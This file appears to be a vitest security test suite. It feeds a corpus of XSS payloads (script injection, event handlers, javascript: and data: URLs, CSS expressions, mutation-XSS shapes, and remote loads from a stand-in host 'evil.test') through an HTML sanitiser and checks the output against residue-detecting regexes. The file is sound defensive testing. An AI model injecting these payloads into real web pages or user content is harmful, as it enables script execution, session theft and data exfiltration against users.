/*
 * Adversarial XSS corpus for the summary-HTML sanitiser.
 *
 * Added by the 2026-08-04 security scan (docs/SECURITY-SCAN-REPORT.md §"Dynamic testing").
 * Classic DAST has no surface in this app — no server, no HTTP endpoint, no database — so
 * the meaningful dynamic test is firing a real payload corpus through the actual sanitiser
 * on the editor → monday save boundary and asserting nothing executable survives.
 *
 * Payload classes: OWASP XSS Filter Evasion + PortSwigger cheat sheet, plus mutation-XSS
 * and parser-confusion shapes. Both public entry points on the save boundary are exercised.
 *
 * This is a security boundary. If a case here starts failing, treat it as a finding, not
 * as a test to relax.
 */
import { describe, it, expect } from 'vitest';
import { sanitizeSummaryHtml, toMondayHtml } from '../summaryHtml.js';

const PAYLOADS = [
  // direct script injection
  '<script>alert(1)</script>',
  '<script src="https://evil.test/x.js"></script>',
  '<SCRIPT>alert(1)</SCRIPT>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<script/xss>alert(1)</script>',
  '<script\n>alert(1)</script>',

  // event handlers on otherwise-allowed tags
  '<p onclick="alert(1)">x</p>',
  '<p OnClIcK="alert(1)">x</p>',
  '<p onmouseover=alert(1)>x</p>',
  '<b onerror="alert(1)">x</b>',
  '<div onfocus="alert(1)" autofocus>x</div>',
  '<p onload="alert(1)">x</p>',
  '<p on\tclick="alert(1)">x</p>',

  // image / media error handlers
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)" />',
  '<img/src="x"/onerror="alert(1)">',
  '<video><source onerror="alert(1)">',
  '<audio src=x onerror=alert(1)>',
  '<body onload=alert(1)>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',

  // javascript: / data: / vbscript: URLs, including entity + whitespace evasion
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#09;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',

  // style-based
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<p style="width:expression(alert(1))">x</p>',
  '<p style="background-image:url(\'https://evil.test/t.png\')">x</p>',
  '<style>body{background:url(javascript:alert(1))}</style>',
  '<p style="behavior:url(#default#time2)">x</p>',

  // frames / objects / embeds / document-level
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="https://evil.test/x.swf">',
  '<link rel="stylesheet" href="https://evil.test/x.css">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.test/">',

  // form / interactive
  '<form action="https://evil.test"><button>x</button></form>',
  '<input value="x" onfocus="alert(1)" autofocus>',
  '<textarea onfocus=alert(1) autofocus>x</textarea>',
  '<isindex action="javascript:alert(1)">',

  // mutation XSS / parser confusion
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><script>alert(1)</script></template>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
  '<!--<img src=x onerror=alert(1)>-->',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<p>a</p><script>alert(1)</script><p>b</p>',

  // attribute smuggling alongside a legitimate attribute
  '<a href="https://ok.test" onclick="alert(1)">x</a>',
  '<p class="x" srcset="y" formaction="javascript:alert(1)">x</p>',
  '<p data-x="1" xlink:href="javascript:alert(1)">x</p>',
];

// Executable residue detectors. Each is a property of the OUTPUT, so they hold no
// matter how the sanitiser is implemented internally.
const DETECTORS = [
  [/<\s*script/i, 'script tag'],
  [/<\s*iframe/i, 'iframe'],
  [/<\s*object/i, 'object'],
  [/<\s*embed/i, 'embed'],
  [/<\s*link/i, 'link'],
  [/<\s*meta/i, 'meta'],
  [/<\s*style/i, 'style tag'],
  [/<\s*base[\s>]/i, 'base tag'],
  [/<\s*form/i, 'form'],
  [/\son[a-z]+\s*=/i, 'event-handler attribute'],
  [/javascript\s*:/i, 'javascript: URL'],
  [/vbscript\s*:/i, 'vbscript: URL'],
  [/data\s*:\s*text\/html/i, 'data:text/html URL'],
  [/expression\s*\(/i, 'CSS expression()'],
  [/url\s*\(/i, 'CSS url()'],
  [/srcdoc\s*=/i, 'srcdoc'],
  [/formaction\s*=/i, 'formaction'],
];

const residue = (out) =>
  DETECTORS.filter(([re]) => re.test(String(out ?? ''))).map(([, name]) => name);

describe('summaryHtml — adversarial XSS corpus', () => {
  // Guards the guard: if the detectors ever stop matching raw malicious HTML, every
  // case below would pass vacuously and this suite would be worthless.
  it('detectors fire on unsanitised input (positive control)', () => {
    expect(residue('<script>alert(1)</script>')).toContain('script tag');
    expect(residue('<p onclick="alert(1)">x</p>')).toContain('event-handler attribute');
    expect(residue('<a href="javascript:alert(1)">x</a>')).toContain('javascript: URL');
    expect(residue('<p style="width:expression(alert(1))">x</p>')).toContain('CSS expression()');
  });

  describe.each([
    ['sanitizeSummaryHtml', sanitizeSummaryHtml],
    ['toMondayHtml', toMondayHtml],
  ])('%s leaves no executable residue', (_label, fn) => {
    it.each(PAYLOADS)('neutralises %j', (payload) => {
      let out;
      try {
        out = fn(payload);
      } catch {
        // A throw is a safe outcome: nothing reaches the save path.
        return;
      }
      expect(residue(out)).toEqual([]);
    });
  });
});
